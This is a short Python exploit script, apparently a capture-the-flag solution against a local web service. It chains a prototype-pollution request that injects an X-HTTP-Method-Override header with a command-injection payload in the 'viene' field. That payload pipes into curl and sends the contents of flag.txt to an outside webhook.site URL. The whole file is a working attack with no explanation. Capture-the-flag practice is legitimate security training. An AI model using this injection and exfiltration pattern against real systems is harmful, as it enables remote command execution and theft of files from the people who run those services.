import requests

VIENE_URL_SUBMIT = 'http://localhost:8080/submitaviene'
VIENE_URL = "http://localhost:8080/findaviene"

put_data = {"__proto__": {"headers": {"X-HTTP-Method-Override": "PUT"}}}

payload = {"viene":"|curl https://webhook.site/aa3d8808-1cf5-486d-b709-d5716f4e8547 --data \"$(cat flag.txt)\""}

r = requests.post(VIENE_URL_SUBMIT, json=put_data)
print(r.text)
r = requests.post(VIENE_URL, json=payload)
print(r.text)